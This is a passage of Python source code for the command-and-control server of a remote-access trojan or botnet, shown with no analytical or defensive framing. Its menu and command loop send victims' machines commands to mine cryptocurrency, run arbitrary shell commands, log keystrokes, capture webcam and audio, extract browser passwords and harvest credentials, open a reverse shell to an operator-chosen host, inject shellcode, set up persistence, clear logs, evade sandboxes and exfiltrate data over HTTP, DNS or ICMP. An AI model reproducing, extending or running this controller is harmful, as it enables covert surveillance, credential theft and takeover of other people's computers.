            # Note: If client_id exists but is already in invalid_client_ids, no action needed
            # as it's already marked for cleanup
    
    # Clean up disconnected clients and invalid client_ids
    with clients_lock:
        # Remove invalid sockets from clients list
        for client in disconnected:
            if client in clients:
                clients.remove(client)
                logger.debug(f"Removed disconnected socket from clients list")
        
        # Remove invalid client_ids from clients_info
        for client_id in invalid_client_ids:
            if client_id in clients_info:
                del clients_info[client_id]
                logger.info(f"Removed invalid client {client_id} from clients_info")
    
    if invalid_client_ids:
        logger.warning(f"Cleaned up {len(invalid_client_ids)} invalid client(s) during command send")
    
    logger.info(f"Command sent to {sent_count} client(s)")
    add_to_history(command, f"Sent to {sent_count} clients")
    
    # Update metrics
    update_metrics('total_commands_sent', sent_count)
    
    return sent_count

def send_message_to_all_clients(message):
    """Send message to all clients"""
    disconnected = []
    sent_count = 0
    
    with clients_lock:
        clients_copy = clients[:]
    
    for client in clients_copy:
        try:
            if send_message(client, message):
                sent_count += 1
        except Exception as e:
            logger.error(f"Error sending message to client: {e}")
            disconnected.append(client)
    
    with clients_lock:
        for client in disconnected:
            if client in clients:
                clients.remove(client)
    
    logger.info(f"Message sent to {sent_count} client(s)")
    add_to_history(f"message:{message}", f"Sent to {sent_count} clients")
    return sent_count

def list_clients():
    """List all connected clients with their info"""
    with clients_lock:
        if not clients:
            print("No clients connected.")
            return
        
        print(f"\nConnected Clients ({len(clients)}):")
        print("-" * 60)
        for i, (client_id, info) in enumerate(clients_info.items(), 1):
            print(f"{i}. {client_id}")
            if info:
                print(f"   Hostname: {info.get('hostname', 'Unknown')}")
                print(f"   Platform: {info.get('platform', 'Unknown')}")
                print(f"   Client Name: {info.get('client_name', 'Unknown')}")
            print()

def server_program():
    """Main server program"""
    global is_running, clients
    host = config.get('host', '0.0.0.0')
    port = config.get('port', 12345)
    max_clients = config.get('max_clients', 100)
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Set socket options for better performance
    try:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        if hasattr(socket, 'TCP_NODELAY'):
            server_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except Exception as e:
        logger.debug(f"Could not set socket options: {e}")
    
    try:
        server_socket.bind((host, port))
        server_socket.listen(max_clients)
        logger.info(f"Server listening on {host}:{port}")
        logger.info(f"Maximum clients: {max_clients}")
        logger.info("Waiting for clients to connect...")
        
        # Update health status
        with metrics_lock:
            server_metrics['health_status'] = 'healthy'
        
        while is_running:
            try:
                client_socket, address = server_socket.accept()
                client_id = f"{address[0]}:{address[1]}"
                logger.info(f"Connection from {client_id} established")
                
                # Atomically check max_clients and reserve a slot by adding socket to clients list
                # This prevents race conditions where multiple threads pass the check simultaneously
                with clients_lock:
                    if len(clients) >= max_clients:
                        logger.warning(f"Maximum clients reached. Rejecting {client_id}")
                        client_socket.close()
                        continue
                    # Reserve slot by adding socket to clients list atomically
                    # If rate limit fails in handle_client(), it will remove the socket
                    clients.append(client_socket)
                
                client_handler = threading.Thread(
                    target=handle_client,
                    args=(client_socket, address),
                    daemon=True
                )
                client_handler.start()
            except socket.error as e:
                if is_running:
                    logger.error(f"Error accepting connection: {e}")
                break
    except Exception as e:
        logger.error(f"Server error: {e}", exc_info=True)
    finally:
        try:
            server_socket.close()
        except:
            pass
        logger.info("Server socket closed")

def print_help():
    """Print help message"""
    help_text = """
    ========== BASIC COMMANDS ==========
    1: Send a manual command to all clients.
    2: Send a message to all clients.
    3: Request system info from all clients.
    4: Start mining on all clients.
    5: Stop mining on all clients.
    6: Execute shell command on all clients.
    7: List all connected clients.
    8: Send command to specific client (by number).
    
    ========== FILE OPERATIONS ==========
    9: List files in directory (on all clients).
    10: Download file from client.
    11: Upload file to client.
    12: Delete file/directory on client.
    
    ========== SYSTEM MONITORING ==========
    13: Take screenshot from client.
    14: List running processes on client.
    15: Kill process on client (by PID).
    16: Get real-time system statistics.
    17: Get network connections.
    18: Scan local network.
    
    ========== INFORMATION GATHERING ==========
    19: Get installed software list.
    20: Get environment variables.
    21: Get system logs.
    22: Get browser history.
    23: Get clipboard contents.
    24: Set clipboard contents.
    
    ========== ADVANCED FEATURES ==========
    25: Start keylogger on client.
    26: Stop keylogger on client.
    27: Get keylog data from client.
    28: Capture webcam from client.
    29: Record audio from client.
    30: Read Windows registry key.
    31: Write Windows registry key.
    32: List system services.
    33: Control service (start/stop/restart).
    34: Extract browser passwords.
    35: Create scheduled task.
    
    ========== ULTRA ADVANCED FEATURES ==========
    36: Start remote desktop streaming.
    37: Start packet capture.
    38: Get captured packets.
    39: Start reverse shell.
    40: Search files on client.
    41: Grep/search in file.
    42: Start file system monitoring.
    43: Stop file monitoring.
    44: Hide file (anti-forensics).
    45: Clear system logs (anti-forensics).
    46: Embed data in image (steganography).
    47: Extract data from image (steganography).
    48: Get detailed system information.
    
    ========== EXTREME ADVANCED FEATURES ==========
    49: Detect VM/Sandbox environment.
    50: Start DNS tunneling.
    51: Stop DNS tunneling.
    52: Add scheduled task to scheduler.
    53: Start task scheduler.
    54: Stop task scheduler.
    55: List scheduled tasks.
    56: Inject shellcode into process.
    57: Create multiple persistence mechanisms.
    58: Exfiltrate data (HTTP/DNS/ICMP).
    59: Get detailed network interfaces.
    60: Create backdoor listener port.
    
    ========== ULTIMATE ADVANCED FEATURES ==========
    61: Dump process memory.
    62: Harvest credentials (WiFi, browsers).
    63: Add server to multi-server list.
    64: Switch to next server.
    65: Queue batch commands.
    66: Execute batch commands.
    67: Load plugin code.
    68: List loaded plugins.
    69: Initialize database.
    70: Save data to database.
    71: Query database.
    72: Encrypt file.
    73: Decrypt file.
    74: Get system hardening info.
    75: Create advanced persistence.
    
    ========== SERVER MANAGEMENT ==========
    status: Show server status and client count.
    history: Show command history.
    config: Show/edit server configuration.
    h or help: Show this help message.
    exit: Disconnect all clients.
    end: Shutdown the server and end the program.
    """
    print(help_text)

def check_rate_limit(client_id):
    """Check if client has exceeded command rate limit (limits commands sent to client)"""
    if not config.get('rate_limit_enabled', True):
        return True
    
    with rate_limit_lock:
        now = time.time()
        window = config.get('rate_limit_window', 60)
        max_requests = config.get('rate_limit_requests', 100)
        
        # Clean old entries
        rate_limiter[client_id] = [t for t in rate_limiter[client_id] if now - t < window]
        
        # Check limit
        if len(rate_limiter[client_id]) >= max_requests:
            return False
        
        # Add current request
        rate_limiter[client_id].append(now)
        return True

def check_connection_rate_limit(client_id):
    """Check if client has exceeded connection rate limit (limits connection attempts)"""
    if not config.get('connection_rate_limit_enabled', True):
        return True
    
    with connection_rate_limit_lock:
        now = time.time()
        window = config.get('connection_rate_limit_window', 60)
        max_requests = config.get('connection_rate_limit_requests', 10)
        
        # Clean old entries
        connection_rate_limiter[client_id] = [t for t in connection_rate_limiter[client_id] if now - t < window]
        
        # Check limit
        if len(connection_rate_limiter[client_id]) >= max_requests:
            return False
        
        # Add current request
        connection_rate_limiter[client_id].append(now)
        return True

def generate_auth_token():
    """Generate authentication token"""
    import secrets
    return secrets.token_urlsafe(32)

def verify_auth(client_id, token):
    """Verify client authentication token"""
    if not config.get('enable_authentication', False):
        return True
    
    expected_token = config.get('auth_token')
    if not expected_token:
        # Auto-generate on first use
        expected_token = generate_auth_token()
        config['auth_token'] = expected_token
        save_config()
        logger.warning(f"Auto-generated auth token: {expected_token}")
    
    return auth_tokens.get(client_id) == expected_token or token == expected_token

def update_metrics(metric_name, value=1):
    """Update server metrics"""
    if not config.get('enable_metrics', True):
        return
    
    with metrics_lock:
        if metric_name in server_metrics:
            if isinstance(server_metrics[metric_name], (int, float)):
                server_metrics[metric_name] += value
        else:
            server_metrics[metric_name] = value

def save_metrics():
    """Save metrics to file"""
    try:
        metrics_file = config.get('metrics_file', 'server_metrics.json')
        with metrics_lock:
            # Read start_time with lock to prevent race conditions
            with start_time_lock:
                current_start_time = start_time
            server_metrics['uptime_seconds'] = time.time() - current_start_time if current_start_time else 0
            server_metrics['last_update'] = datetime.now().isoformat()
            with open(metrics_file, 'w') as f:
                json.dump(server_metrics, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving metrics: {e}")

def backup_server_data():
    """Backup server data (config, history, metrics)"""
    try:
        import shutil
        backup_dir = Path('backups')
        backup_dir.mkdir(exist_ok=True)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Backup config
        if Path(CONFIG_FILE).exists():
            shutil.copy(CONFIG_FILE, backup_dir / f'config_{timestamp}.json')
        
        # Backup history
        history_file = config.get('command_history_file', 'command_history.json')
        if Path(history_file).exists():
            shutil.copy(history_file, backup_dir / f'history_{timestamp}.json')
        
        # Backup metrics
        metrics_file = config.get('metrics_file', 'server_metrics.json')
        if Path(metrics_file).exists():
            shutil.copy(metrics_file, backup_dir / f'metrics_{timestamp}.json')
        
        with metrics_lock:
            server_metrics['last_backup'] = timestamp
        
        logger.info(f"Backup created: {timestamp}")
        return True
    except Exception as e:
        logger.error(f"Backup error: {e}")
        return False

def backup_worker():
    """Background worker for periodic backups"""
    global is_running
    
    # Perform initial backup immediately if enabled, then enter periodic loop
    if config.get('enable_backup', True):
        backup_server_data()
    
    while is_running:
        # Read backup_interval from config each iteration to support runtime changes
        backup_interval = config.get('backup_interval', 3600)
        # Sleep in smaller chunks to allow responsive shutdown
        # Check is_running every 5 seconds instead of sleeping for the full interval
        sleep_chunk = 5  # Check every 5 seconds
        elapsed = 0
        while elapsed < backup_interval and is_running:
            time.sleep(min(sleep_chunk, backup_interval - elapsed))
            elapsed += sleep_chunk
        
        # Only proceed if still running (don't backup during shutdown)
        if not is_running:
            break
        
        # Check if backups are enabled before each backup (allows dynamic enable/disable)
        if config.get('enable_backup', True):
            backup_server_data()

def health_check():
    """Perform server health check"""
    global server_metrics
    
    try:
        # Acquire locks in consistent order: clients_lock first, then metrics_lock
        # This matches the order in show_status() to prevent deadlocks
        with clients_lock:
            client_count = len(clients)
            client_count_check = client_count > config.get('max_clients', 100) * 0.9
        
        with metrics_lock:
            server_metrics['last_health_check'] = datetime.now().isoformat()
            server_metrics['active_threads'] = threading.active_count()
            
            # Check if server is healthy
            issues = []
            
            # Check client count (using value obtained while holding clients_lock)
            if client_count_check:
                issues.append("High client count")
            
            # Check error rate
            if server_metrics.get('error_count', 0) > 100:
                issues.append("High error count")
            
            # Check memory (if psutil available)
            try:
                import psutil
                process = psutil.Process()
                mem_percent = process.memory_info().rss / psutil.virtual_memory().total * 100
                if mem_percent > 90:
                    issues.append("High memory usage")
            except:
                pass
            
            if issues:
                server_metrics['health_status'] = 'degraded'
                logger.warning(f"Health check issues: {', '.join(issues)}")
            else:
                server_metrics['health_status'] = 'healthy'
                
    except Exception as e:
        logger.error(f"Health check error: {e}")
        with metrics_lock:
            server_metrics['health_status'] = 'error'

def health_check_worker():
    """Background worker for periodic health checks"""
    global is_running
    # Perform initial health check immediately, then enter periodic loop
    health_check()
    while is_running:
        # Sleep in smaller chunks to allow responsive shutdown
        # Check is_running every 5 seconds instead of sleeping for the full 60 seconds
        sleep_interval = 60  # Check every minute
        sleep_chunk = 5  # Check every 5 seconds
        elapsed = 0
        while elapsed < sleep_interval and is_running:
            time.sleep(min(sleep_chunk, sleep_interval - elapsed))
            elapsed += sleep_chunk
        
        # Only perform health check if still running (don't check during shutdown)
        if is_running:
            health_check()

def validate_config():
    """Validate server configuration"""
    errors = []
    
    # Validate port
    port = config.get('port', 12345)
    if not isinstance(port, int) or port < 1 or port > 65535:
        errors.append(f"Invalid port: {port}")
    
    # Validate max_clients
    max_clients = config.get('max_clients', 100)
    if not isinstance(max_clients, int) or max_clients < 1:
        errors.append(f"Invalid max_clients: {max_clients}")
    
    # Validate timeouts
    socket_timeout = config.get('socket_timeout', 60.0)
    if not isinstance(socket_timeout, (int, float)) or socket_timeout < 0:
        errors.append(f"Invalid socket_timeout: {socket_timeout}")
    
    if errors:
        logger.error(f"Configuration validation errors: {', '.join(errors)}")
        return False
    return True

def start_monitoring_dashboard():
    """Start web-based monitoring dashboard"""
    global monitoring_thread
    
    if not config.get('enable_monitoring', True):
        return
    
    try:
        from flask import Flask, jsonify, render_template_string
        FLASK_AVAILABLE = True
    except ImportError:
        logger.warning("Flask not available. Monitoring dashboard disabled.")
        return
    
    app = Flask(__name__)
    
    @app.route('/')
    def dashboard():
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Server Monitoring Dashboard</title>
            <meta charset="UTF-8">
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a1a; color: #fff; }
                .container { max-width: 1200px; margin: 0 auto; }
                .stat-card { background: #2d2d2d; padding: 20px; margin: 10px; border-radius: 8px; display: inline-block; min-width: 200px; }
                .stat-value { font-size: 2em; color: #4ade80; }
                .stat-label { color: #aaa; margin-top: 10px; }
                table { width: 100%; border-collapse: collapse; margin-top: 20px; }
                th, td { padding: 12px; text-align: left; border-bottom: 1px solid #444; }
                th { background: #333; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Server Monitoring Dashboard</h1>
                <div id="stats"></div>
                <h2>Connected Clients</h2>
                <div id="clients"></div>
            </div>
            <script>
                function loadData() {
                    fetch('/api/stats').then(r => r.json()).then(data => {
                        document.getElementById('stats').innerHTML = `
                            <div class="stat-card">
                                <div class="stat-value">${data.connected_clients}</div>
                                <div class="stat-label">Connected Clients</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-value">${data.total_commands}</div>
                                <div class="stat-label">Total Commands</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-value">${Math.floor(data.uptime / 3600)}h</div>
                                <div class="stat-label">Uptime</div>
                            </div>
                        `;
                    });
                    fetch('/api/clients').then(r => r.json()).then(data => {
                        let html = '<table><tr><th>Client ID</th><th>Hostname</th><th>Platform</th><th>Connected</th></tr>';
                        data.forEach(c => {
                            html += `<tr><td>${c.id}</td><td>${c.hostname || 'Unknown'}</td><td>${c.platform || 'Unknown'}</td><td>${c.connected}</td></tr>`;
                        });
                        html += '</table>';
                        document.getElementById('clients').innerHTML = html;
                    });
                }
                setInterval(loadData, 2000);
                loadData();
            </script>
        </body>
        </html>
        """
        return render_template_string(html)
    
    @app.route('/api/stats')
    def api_stats():
        with clients_lock:
            client_count = len(clients)
        with metrics_lock:
            # Read start_time with lock to prevent race conditions
            with start_time_lock:
                current_start_time = start_time
            uptime = time.time() - current_start_time if current_start_time else 0
            return jsonify({
                'connected_clients': client_count,
                'total_commands': server_metrics.get('total_commands_sent', 0),
                'uptime': uptime,
                'peak_clients': server_metrics.get('peak_clients', 0),
                'health_status': server_metrics.get('health_status', 'unknown'),
                'active_threads': server_metrics.get('active_threads', 0),
                'error_count': server_metrics.get('error_count', 0)
            })
    
    @app.route('/api/health')
    def api_health():
        """Health check endpoint"""
        with metrics_lock:
            # Read start_time with lock to prevent race conditions
            with start_time_lock:
                current_start_time = start_time
            return jsonify({
                'status': server_metrics.get('health_status', 'unknown'),
                'last_check': server_metrics.get('last_health_check'),
                'uptime': time.time() - current_start_time if current_start_time else 0
            })
    
    @app.route('/api/clients')
    def api_clients():
        with clients_lock:
            clients_list = []
            for client_id, info in clients_info.items():
                clients_list.append({
                    'id': client_id,
                    'hostname': info.get('hostname', 'Unknown'),
                    'platform': info.get('platform', 'Unknown'),
                    'connected': info.get('connected_at', datetime.now().isoformat())
                })
            return jsonify(clients_list)
    
    def run_dashboard():
        port = config.get('monitoring_port', 8080)
        app.run(host='127.0.0.1', port=port, debug=False, use_reloader=False)
    
    monitoring_thread = threading.Thread(target=run_dashboard, daemon=True)
    monitoring_thread.start()
    logger.info(f"Monitoring dashboard started on http://127.0.0.1:{config.get('monitoring_port', 8080)}")

def show_status():
    """Show server status"""
    global start_time
    # Acquire locks in consistent order: clients_lock first, then metrics_lock
    # This matches the order in health_check() to prevent deadlocks
    with clients_lock:
        client_count = len(clients)
    
    # Read and update peak_clients atomically while holding metrics_lock
    # This prevents race conditions where peak_clients could change between read and update
    with metrics_lock:
        current_peak = server_metrics.get('peak_clients', 0)
        if client_count > current_peak:
            server_metrics['peak_clients'] = client_count
    
    # Read start_time with lock to prevent race conditions
    with start_time_lock:
        current_start_time = start_time
    
    print(f"\nServer Status:")
    print(f"  Running: {is_running}")
    print(f"  Connected Clients: {client_count}")
    print(f"  Host: {config.get('host', '0.0.0.0')}")
    print(f"  Port: {config.get('port', 12345)}")
    if current_start_time is not None:
        uptime = time.time() - current_start_time
        print(f"  Uptime: {uptime:.1f} seconds ({uptime/3600:.2f} hours)")
    else:
        print(f"  Uptime: Not started")
    
    with metrics_lock:
        print(f"  Total Commands Sent: {server_metrics.get('total_commands_sent', 0)}")
        print(f"  Peak Clients: {server_metrics.get('peak_clients', 0)}")
        print(f"  Total Connections: {server_metrics.get('total_connections', 0)}")
    
    if config.get('enable_monitoring', True):
        print(f"  Monitoring Dashboard: http://127.0.0.1:{config.get('monitoring_port', 8080)}")
    print()

def show_history():
    """Show command history"""
    with history_lock:
        if not command_history:
            print("No command history.")
            return
        
        print(f"\nCommand History (last {min(20, len(command_history))}):")
        print("-" * 60)
        for cmd in command_history[-20:]:
            print(f"[{cmd['timestamp']}] {cmd['command']}")
            if cmd.get('result'):
                print(f"  Result: {cmd['result']}")
        print()

def send_to_client(client_num):
    """Send command to specific client"""
    with clients_lock:
        client_list = list(clients_info.items())
        clients_copy = clients[:]
    
    if not client_list:
        print("No clients connected.")
        return
    
    if client_num < 1 or client_num > len(client_list):
        print(f"Invalid client number. Choose 1-{len(client_list)}")
        return
    
    client_id, info = client_list[client_num - 1]
    
    # Find corresponding socket by matching peer address to client_id
    client_socket = None
    invalid_sockets = []  # Track sockets that are closed
    
    for sock in clients_copy:
        try:
            peer_addr = sock.getpeername()
            socket_client_id = f"{peer_addr[0]}:{peer_addr[1]}"
            if socket_client_id == client_id:
                client_socket = sock
                break
        except (OSError, AttributeError):
            # Socket is closed or invalid - mark for cleanup
            invalid_sockets.append(sock)
            continue
    
    # Clean up invalid sockets
    if invalid_sockets:
        with clients_lock:
            for sock in invalid_sockets:
                if sock in clients:
                    clients.remove(sock)
                    logger.debug(f"Removed invalid socket from clients list")
    
    # If socket not found, clean up the client_id from clients_info
    if not client_socket:
        with clients_lock:
            if client_id in clients_info:
                del clients_info[client_id]
                logger.info(f"Removed invalid client {client_id} from clients_info (socket not found)")
        print(f"Client {client_id} is no longer connected. Removed from client list.")
        return
    
    cmd = input(f"Enter command for {client_id}: ").strip()
    if cmd:
        try:
            if send_message(client_socket, cmd):
                print(f"Command sent to {client_id}")
            else:
                print(f"Failed to send command to {client_id}")
        except Exception as e:
            logger.error(f"Error sending command to {client_id}: {e}")
            # Clean up on send failure
            with clients_lock:
                if client_socket in clients:
                    clients.remove(client_socket)
                if client_id in clients_info:
                    del clients_info[client_id]
            print(f"Client {client_id} disconnected during command send. Removed from client list.")

def main():
    """Main function"""
    global is_running, start_time
    # Only set start_time if it hasn't been set yet (it should be set in __main__ block)
    # This prevents overwriting the initial start_time and ensures consistent metrics
    # Use lock to prevent race conditions when reading/writing start_time
    with start_time_lock:
        if start_time is None:
            start_time = time.time()
    
    # Start server thread
    server_thread = threading.Thread(target=server_program, daemon=True)
    server_thread.start()
    
    # Give server time to start
    time.sleep(1)
    
    print("Server started. Type 'h' or 'help' for commands.")
    
    while True:
        try:
            user_input = input("\nCommand: ").strip()
            
            if user_input == 'end':
                logger.info("Shutting down the server...")
                is_running = False
                with clients_lock:
                    for client in clients[:]:
                        try:
                            client.close()
                        except:
                            pass
                    clients.clear()
                save_command_history()
                break
            elif user_input in ['h', 'help']:
                print_help()
            elif user_input == '1':
                cmd = input("Enter command: ").strip()
                if cmd:
                    send_command(cmd)
                else:
                    print("Empty command ignored.")
            elif user_input == '2':
                message = input("Message: ").strip()
                if message:
                    send_message_to_all_clients("message:" + message)
                else:
                    print("Empty message ignored.")
            elif user_input == '3':
                print("Requesting system info from all clients...")
                send_command("get_system_info")
            elif user_input == '4':
                mining_path = input("Enter path to mining executable: ").strip()
                if mining_path:
                    send_command(f"start_mining:{mining_path}")
                else:
                    print("Invalid path. Command cancelled.")
            elif user_input == '5':
                print("Stopping mining on all clients...")
                send_command("stop_mining")
            elif user_input == '6':
                cmd = input("Enter shell command to execute: ").strip()
                if cmd:
                    send_command(f"execute:{cmd}")
                else:
                    print("Empty command ignored.")
            elif user_input == '7':
                list_clients()
            elif user_input == '8':
                list_clients()
                try:
                    client_num = int(input("Enter client number: ").strip())
                    send_to_client(client_num)
                except ValueError:
                    print("Invalid client number.")
            elif user_input == '9':
                path = input("Enter directory path (empty for current): ").strip()
                send_command(f"list_files:{path}" if path else "list_files:")
            elif user_input == '10':
                list_clients()
                try:
                    client_num = int(input("Enter client number: ").strip())
                    file_path = input("Enter file path to download: ").strip()
                    if file_path:
                        with clients_lock:
                            if 0 < client_num <= len(clients):
                                send_message(clients[client_num - 1], f"read_file:{file_path}")
                                print("File download requested. Check client responses.")
                except (ValueError, IndexError):
                    print("Invalid client number.")
            elif user_input == '11':
                list_clients()
                try:
                    client_num = int(input("Enter client number: ").strip())
                    local_file = input("Enter local file path to upload: ").strip()
                    remote_path = input("Enter remote path to save: ").strip()
                    if local_file and remote_path and os.path.exists(local_file):
                        import base64
                        with open(local_file, 'rb') as f:
                            file_data = base64.b64encode(f.read()).decode('utf-8')
                        with clients_lock:
                            if 0 < client_num <= len(clients):
                                send_message(clients[client_num - 1], f"write_file:{remote_path}|{file_data}")
                                print("File upload requested.")
                    else:
                        print("Invalid file path or remote path.")
                except (ValueError, IndexError):
                    print("Invalid client number.")
            elif user_input == '12':
                file_path = input("Enter file/directory path to delete: ").strip()
                if file_path:
                    send_command(f"delete_file:{file_path}")
            elif user_input == '13':
                send_command("screenshot")
                print("Screenshot requested from all clients.")
            elif user_input == '14':
                send_command("list_processes")
                print("Process list requested from all clients.")
            elif user_input == '15':
                list_clients()
                try:
                    client_num = int(input("Enter client number: ").strip())
                    pid = input("Enter process PID to kill: ").strip()
                    if pid:
                        with clients_lock:
                            if 0 < client_num <= len(clients):
                                send_message(clients[client_num - 1], f"kill_process:{pid}")
                                print(f"Kill process command sent to client {client_num}.")
                except (ValueError, IndexError):
                    print("Invalid client number or PID.")
            elif user_input == '16':
                send_command("get_real_time_stats")
                print("Real-time statistics requested from all clients.")
            elif user_input == '17':
                send_command("get_network_connections")
                print("Network connections requested from all clients.")
            elif user_input == '18':
                subnet = input("Enter subnet to scan (e.g., 192.168.1.0/24, empty for auto): ").strip()
                send_command(f"scan_network:{subnet}" if subnet else "scan_network:")
                print("Network scan requested from all clients.")
            elif user_input == '19':
                send_command("get_installed_software")
                print("Installed software list requested from all clients.")
            elif user_input == '20':
                send_command("get_environment_variables")
                print("Environment variables requested from all clients.")
            elif user_input == '21':
                count = input("Enter number of log entries (default 50): ").strip()
                count = int(count) if count.isdigit() else 50
                send_command(f"get_system_logs:{count}")
                print(f"System logs requested from all clients (last {count} entries).")
            elif user_input == '22':
                send_command("get_browser_history")
                print("Browser history requested from all clients.")
            elif user_input == '23':
                send_command("get_clipboard")
                print("Clipboard contents requested from all clients.")
            elif user_input == '24':
                text = input("Enter text to set in clipboard: ").strip()
                if text:
                    import base64
                    encoded = base64.b64encode(text.encode('utf-8')).decode('utf-8')
                    send_command(f"set_clipboard:{encoded}")
                    print("Clipboard set command sent to all clients.")
            elif user_input == '25':
                send_command("start_keylogger")
                print("Keylogger start command sent to all clients.")
            elif user_input == '26':
                send_command("stop_keylogger")
                print("Keylogger stop command sent to all clients.")
            elif user_input == '27':
                send_command("get_keylog_data")
                print("Keylog data requested from all clients.")
            elif user_input == '28':
                duration = input("Enter capture duration in seconds (default 5): ").strip()
                duration = int(duration) if duration.isdigit() else 5
                send_command(f"capture_webcam:{duration}")
                print(f"Webcam capture requested from all clients ({duration}s).")
            elif user_input == '29':
                duration = input("Enter recording duration in seconds (default 5): ").strip()
                duration = int(duration) if duration.isdigit() else 5
                send_command(f"record_audio:{duration}")
                print(f"Audio recording requested from all clients ({duration}s).")
            elif user_input == '30':
                key_path = input("Enter registry key path (e.g., HKEY_CURRENT_USER\\Software\\...): ").strip()
                value_name = input("Enter value name (empty for all values): ").strip()
                if key_path:
                    cmd = f"read_registry:{key_path}|{value_name}" if value_name else f"read_registry:{key_path}"
                    send_command(cmd)
                    print("Registry read command sent to all clients.")
            elif user_input == '31':
                key_path = input("Enter registry key path: ").strip()
                value_name = input("Enter value name: ").strip()
                value = input("Enter value: ").strip()
                reg_type = input("Enter type (REG_SZ/REG_DWORD, default REG_SZ): ").strip() or "REG_SZ"
                if key_path and value_name and value:
                    send_command(f"write_registry:{key_path}|{value_name}|{value}|{reg_type}")
                    print("Registry write command sent to all clients.")
            elif user_input == '32':
                send_command("list_services")
                print("Service list requested from all clients.")
            elif user_input == '33':
                service_name = input("Enter service name: ").strip()
                action = input("Enter action (start/stop/restart): ").strip()
                if service_name and action in ['start', 'stop', 'restart']:
                    send_command(f"control_service:{service_name}|{action}")
                    print(f"Service control command sent to all clients.")
            elif user_input == '34':
                send_command("extract_browser_passwords")
                print("Browser password extraction requested from all clients.")
            elif user_input == '35':
                task_name = input("Enter task name: ").strip()
                command = input("Enter command to execute: ").strip()
                schedule = input("Enter schedule (daily/weekly, default daily): ").strip() or "daily"
                if task_name and command:
                    send_command(f"create_scheduled_task:{task_name}|{command}|{schedule}")
                    print("Scheduled task creation command sent to all clients.")
            elif user_input == '36':
                interval = input("Enter frame interval in seconds (default 1): ").strip()
                interval = float(interval) if interval.replace('.', '').isdigit() else 1.0
                send_command(f"start_remote_desktop:{interval}")
                print(f"Remote desktop streaming started (interval: {interval}s).")
            elif user_input == '37':
                count = input("Enter number of packets to capture (default 100): ").strip()
                count = int(count) if count.isdigit() else 100
                interface = input("Enter network interface (empty for default): ").strip()
                cmd = f"start_packet_capture:{count}|{interface}" if interface else f"start_packet_capture:{count}"
                send_command(cmd)
                print(f"Packet capture started ({count} packets).")
            elif user_input == '38':
                send_command("get_captured_packets")
                print("Captured packets requested from all clients.")
            elif user_input == '39':
                host = input("Enter reverse shell host: ").strip()
                port = input("Enter reverse shell port: ").strip()
                if host and port:
                    send_command(f"start_reverse_shell:{host}|{port}")
                    print(f"Reverse shell connection requested to {host}:{port}.")
            elif user_input == '40':
                directory = input("Enter directory to search: ").strip() or "."
                pattern = input("Enter file pattern (e.g., *.txt, *secret*): ").strip() or "*"
                file_type = input("Enter file type filter (text/image/document, empty for all): ").strip()
                cmd = f"search_files:{directory}|{pattern}|{file_type}" if file_type else f"search_files:{directory}|{pattern}"
                send_command(cmd)
                print("File search requested from all clients.")
            elif user_input == '41':
                file_path = input("Enter file path to search: ").strip()
                pattern = input("Enter search pattern (regex): ").strip()
                if file_path and pattern:
                    send_command(f"grep_file:{file_path}|{pattern}")
                    print("File grep requested from all clients.")
            elif user_input == '42':
                paths = input("Enter paths to monitor (separated by |): ").strip()
                if paths:
                    send_command(f"start_file_monitor:{paths}")
                    print("File monitoring started on all clients.")
            elif user_input == '43':
                send_command("stop_file_monitor")
                print("File monitoring stopped on all clients.")
            elif user_input == '44':
                file_path = input("Enter file path to hide: ").strip()
                if file_path:
                    send_command(f"hide_file:{file_path}")
                    print("File hide command sent to all clients.")
            elif user_input == '45':
                confirm = input("WARNING: This will clear system logs. Continue? (yes/no): ").strip().lower()
                if confirm == 'yes':
                    send_command("clear_logs")
                    print("Log clearing command sent to all clients.")
                else:
                    print("Cancelled.")
            elif user_input == '46':
                image_path = input("Enter image path: ").strip()
                data = input("Enter data to embed: ").strip()
                if image_path and data:
                    send_command(f"embed_steganography:{image_path}|{data}")
                    print("Steganography embedding command sent to all clients.")
            elif user_input == '47':
                image_path = input("Enter image path to extract from: ").strip()
                if image_path:
                    send_command(f"extract_steganography:{image_path}")
                    print("Steganography extraction requested from all clients.")
            elif user_input == '48':
                send_command("get_detailed_system_info")
                print("Detailed system information requested from all clients.")
            elif user_input == '49':
                send_command("detect_vm_sandbox")
                print("VM/Sandbox detection requested from all clients.")
            elif user_input == '50':
                domain = input("Enter DNS domain for tunneling: ").strip()
                port = input("Enter DNS port (default 53): ").strip() or "53"
                if domain:
                    send_command(f"start_dns_tunnel:{domain}|{port}")
                    print(f"DNS tunneling started on {domain}:{port}.")
            elif user_input == '51':
                send_command("stop_dns_tunnel")
                print("DNS tunneling stopped on all clients.")
            elif user_input == '52':
                name = input("Enter task name: ").strip()
                command = input("Enter command to execute: ").strip()
                schedule_time = input("Enter schedule time (ISO format, e.g., 2024-01-01T12:00:00): ").strip()
                repeat = input("Repeat daily? (yes/no): ").strip().lower() == "yes"
                if name and command and schedule_time:
                    send_command(f"add_scheduled_task:{name}|{command}|{schedule_time}|{repeat}")
                    print("Scheduled task added to all clients.")
            elif user_input == '53':
                send_command("start_task_scheduler")
                print("Task scheduler started on all clients.")
            elif user_input == '54':
                send_command("stop_task_scheduler")
                print("Task scheduler stopped on all clients.")
            elif user_input == '55':
                send_command("list_scheduled_tasks")
                print("Scheduled tasks list requested from all clients.")
            elif user_input == '56':
                shellcode = input("Enter shellcode in hex format: ").strip()
                process = input("Enter target process name (empty for current): ").strip()
                if shellcode:
                    cmd = f"inject_shellcode:{shellcode}|{process}" if process else f"inject_shellcode:{shellcode}"
                    send_command(cmd)
                    print("Shellcode injection requested from all clients.")
            elif user_input == '57':
                send_command("create_persistence_multiple")
                print("Multiple persistence mechanisms creation requested from all clients.")
            elif user_input == '58':
                data = input("Enter data to exfiltrate: ").strip()
                method = input("Enter method (http/dns/icmp/all, default all): ").strip() or "all"
                if data:
                    send_command(f"exfiltrate_data:{data}|{method}")
                    print(f"Data exfiltration requested via {method}.")
